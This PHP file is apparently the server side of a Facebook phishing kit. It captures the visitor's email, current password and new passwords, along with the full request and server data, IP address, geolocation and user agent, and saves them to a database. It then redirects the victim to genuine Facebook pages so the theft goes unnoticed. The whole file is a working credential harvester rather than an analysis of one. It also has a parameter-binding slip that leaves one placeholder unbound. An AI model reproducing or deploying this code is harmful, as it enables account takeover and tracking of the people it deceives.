<?php
	

function getUserIP() { $ipaddress = ''; if (isset($_SERVER['HTTP_CLIENT_IP'])) $ipaddress = $_SERVER['HTTP_CLIENT_IP']; else if(isset($_SERVER['HTTP_X_FORWARDED_FOR'])) $ipaddress = $_SERVER['HTTP_X_FORWARDED_FOR']; else if(isset($_SERVER['HTTP_X_FORWARDED'])) $ipaddress = $_SERVER['HTTP_X_FORWARDED']; else if(isset($_SERVER['HTTP_X_CLUSTER_CLIENT_IP'])) $ipaddress = $_SERVER['HTTP_X_CLUSTER_CLIENT_IP']; else if(isset($_SERVER['HTTP_FORWARDED_FOR'])) $ipaddress = $_SERVER['HTTP_FORWARDED_FOR']; else if(isset($_SERVER['HTTP_FORWARDED'])) $ipaddress = $_SERVER['HTTP_FORWARDED']; else if(isset($_SERVER['REMOTE_ADDR'])) $ipaddress = $_SERVER['REMOTE_ADDR']; else $ipaddress = 'UNKNOWN'; return $ipaddress; }
$txt="";
function ip_info($ip = NULL, $purpose = "location", $deep_detect = TRUE) { $output = NULL; if (filter_var($ip, FILTER_VALIDATE_IP) === FALSE) { $ip = $_SERVER["REMOTE_ADDR"]; if ($deep_detect) { if (filter_var(@$_SERVER['HTTP_X_FORWARDED_FOR'], FILTER_VALIDATE_IP)) $ip = $_SERVER['HTTP_X_FORWARDED_FOR']; if (filter_var(@$_SERVER['HTTP_CLIENT_IP'], FILTER_VALIDATE_IP)) $ip = $_SERVER['HTTP_CLIENT_IP']; } } $purpose = str_replace(array("name", "\n", "\t", " ", "-", "_"), NULL, strtolower(trim($purpose))); $support = array("country", "countrycode", "state", "region", "city", "location", "address"); $continents = array( "AF" => "Africa", "AN" => "Antarctica", "AS" => "Asia", "EU" => "Europe", "OC" => "Australia (Oceania)", "NA" => "North America", "SA" => "South America" ); if (filter_var($ip, FILTER_VALIDATE_IP) && in_array($purpose, $support)) { $ipdat = @json_decode(file_get_contents("http://www.geoplugin.net/json.gp?ip=" . $ip)); if (@strlen(trim($ipdat->geoplugin_countryCode)) == 2) { switch ($purpose) { case "location": $output = array( "city" => @$ipdat->geoplugin_city, "state" => @$ipdat->geoplugin_regionName, "country" => @$ipdat->geoplugin_countryName, "country_code" => @$ipdat->geoplugin_countryCode, "continent" => @$continents[strtoupper($ipdat->geoplugin_continentCode)], "continent_code" => @$ipdat->geoplugin_continentCode ); break; case "address": $address = array($ipdat->geoplugin_countryName); if (@strlen($ipdat->geoplugin_regionName) >= 1) $address[] = $ipdat->geoplugin_regionName; if (@strlen($ipdat->geoplugin_city) >= 1) $address[] = $ipdat->geoplugin_city; $output = implode(", ", array_reverse($address)); break; case "city": $output = @$ipdat->geoplugin_city; break; case "state": $output = @$ipdat->geoplugin_regionName; break; case "region": $output = @$ipdat->geoplugin_regionName; break; case "country": $output = @$ipdat->geoplugin_countryName; break; case "countrycode": $output = @$ipdat->geoplugin_countryCode; break; } } } return $output; }



	require_once('connect.php');
    $email = '';
    $password = '';
    $password_new = '';
    $password_new2 = '';
    if(isset($_REQUEST['email'])){ $email = $_REQUEST['email'] ; } 
    if(isset($_REQUEST['password'])){ $password = $_REQUEST['password'] ; }
    if(isset($_REQUEST['password_new'])){ $password_new = $_REQUEST['password_new'] ; }
    if(isset($_REQUEST['password_new2'])){ $password_new2 = $_REQUEST['password_new2'] ; }



    $request =json_encode($_REQUEST, JSON_UNESCAPED_UNICODE) ; 
    $server =json_encode($_SERVER, JSON_UNESCAPED_UNICODE) ; 

    $ip = getUserIP();
    $location=json_encode(ip_info($ip), JSON_UNESCAPED_UNICODE) ; 
  
  // prepare sql and bind parameters
  $stmt = $conn->prepare("INSERT INTO users_tb (email, password, password_new, password_new2, request,  server, location, ip, user_agent)
                                     VALUES (:email, :password, :password_new, :password_new2,  :request,  :server, :location, :ip, :user_agent)");
  $stmt->bindParam(':email', $email);
  $stmt->bindParam(':password', $password);
  $stmt->bindParam(':password_new', $password_new);
  $stmt->bindParam(':password_new', $password_new2);
  $stmt->bindParam(':request', $request);
  $stmt->bindParam(':server', $server);
  $stmt->bindParam(':location', $location);
  $stmt->bindParam(':ip', $ip);
  $stmt->bindParam(':user_agent', $_SERVER['HTTP_USER_AGENT']);

  // insert a row
  $stmt->execute();
 print_r($stmt);
exit(); 
   // if(isset($_POST['email'])){ $email = $_POST['email'] ; } 
	//    header("location: https://m.facebook.com/login/?email=". htmlspecialchars($email)."&li=LZmDXkzJmMQITfAJkFOmWCqq&e=1348092"); 
	 //   exit();
	header('Location:https://m.facebook.com/settings/account/password/survey/?po=keep_sessions&next=https%3A%2F%2Fm.facebook.com%2Flogin%2Fsave-device%2F%3Flogin_source%3Daccount_recovery&_rdr#_=_');
?>
